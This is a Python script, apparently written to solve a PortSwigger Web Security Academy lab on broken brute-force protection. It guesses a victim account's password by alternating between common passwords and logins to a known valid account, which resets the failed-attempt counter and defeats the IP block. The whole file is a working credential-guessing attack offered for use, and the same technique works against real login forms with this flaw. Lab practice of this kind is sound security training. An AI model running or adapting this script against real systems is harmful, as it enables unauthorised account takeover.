#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Brute force script to exploit "Broken brute-force protection, IP block" lab at
# "https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block".
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

import sys
import requests


if len(sys.argv) != 5:
  print ("\nUsage: {} https://<lab_url>/login <valid_user> <valid_pass> <victim_user>\n".format(sys.argv[0]))

else:

  # Required for color output
  RED    = "\033[1;91m"
  GREEN  = "\033[1;92m"
  YELLOW = "\033[1;93m"
  CYAN   = "\033[96m"
  RESET  = "\033[0m"

  target      = sys.argv[1]
  valid_user  = sys.argv[2]
  valid_pass  = sys.argv[3]
  victim_user = sys.argv[4]

  usernames = (valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user, valid_user, victim_user, victim_user)
  passwords = (valid_pass, "123456", "password", valid_pass, "12345678", "qwerty", valid_pass, "123456789", "12345", valid_pass, "1234", "111111", valid_pass, "1234567", "dragon", valid_pass, "123123", "baseball", valid_pass, "abc123", "football", valid_pass, "monkey", "letmein", valid_pass, "shadow", "master", valid_pass, "666666", "qwertyuiop", valid_pass, "123321", "mustang", valid_pass, "1234567890", "michael", valid_pass, "654321", "superman", valid_pass, "1qaz2wsx", "7777777", valid_pass, "121212", "000000", valid_pass, "qazwsx", "123qwe", valid_pass, "killer", "trustno1", valid_pass, "jordan", "jennifer", valid_pass, "zxcvbnm", "asdfgh", valid_pass, "hunter", "buster", valid_pass, "soccer", "harley", valid_pass, "batman", "andrew", valid_pass, "tigger", "sunshine", valid_pass, "iloveyou", "2000", valid_pass, "charlie", "robert", valid_pass, "thomas", "hockey", valid_pass, "ranger", "daniel", valid_pass, "starwars", "klaster", valid_pass, "112233", "george", valid_pass, "computer", "michelle", valid_pass, "jessica", "pepper", valid_pass, "1111", "zxcvbn", valid_pass, "555555", "11111111", valid_pass, "131313", "freedom", valid_pass, "777777", "pass", valid_pass, "maggie", "159753", valid_pass, "aaaaaa", "ginger", valid_pass, "princess", "joshua", valid_pass, "cheese", "amanda", valid_pass, "summer", "love", valid_pass, "ashley", "nicole", valid_pass, "chelsea", "biteme", valid_pass, "matthew", "access", valid_pass, "yankees", "987654321", valid_pass, "dallas", "austin", valid_pass, "thunder", "taylor", valid_pass, "matrix", "mobilemail", valid_pass, "mom", "monitor", valid_pass, "monitoring", "montana", valid_pass, "moon", "moscow")


  print ("\nBruteforcing the password for the user {}, please wait...\n".format(victim_user))

  for i in range(0, len(usernames)):

    current_user = usernames[i]
    current_pass = passwords[i]

    data = { "username":current_user, "password":current_pass }

    response = requests.post(target, data=data, allow_redirects=False)

    if current_user == valid_user:
      print ("Resetting the failed login attempts counter\t\t{}Done{}"
        .format(YELLOW, RESET))

    else:

      if response.status_code == 200:
        print ("  Trying to login with credentials {}{}{}:{}{}{}\t{}Failed{}"
          .format(CYAN, current_user, RESET, CYAN, current_pass, RESET, RED, RESET))

      elif response.status_code == 302:
        print ("  Trying to login with credentials {}{}{}:{}{}{}\t{}OK{}"
          .format(CYAN, current_user, RESET, CYAN, current_pass, RESET, GREEN, RESET))

        print ("\nThe user {}{}{} has the password {}{}{}!\n"
          .format(GREEN, current_user, RESET, GREEN, current_pass, RESET))

        break

      else:
        print ("\nOperation aborted due the server responded with a {}{}{} status code.\n"
          .format(RED, response.status_code, RESET))

        exit(1)
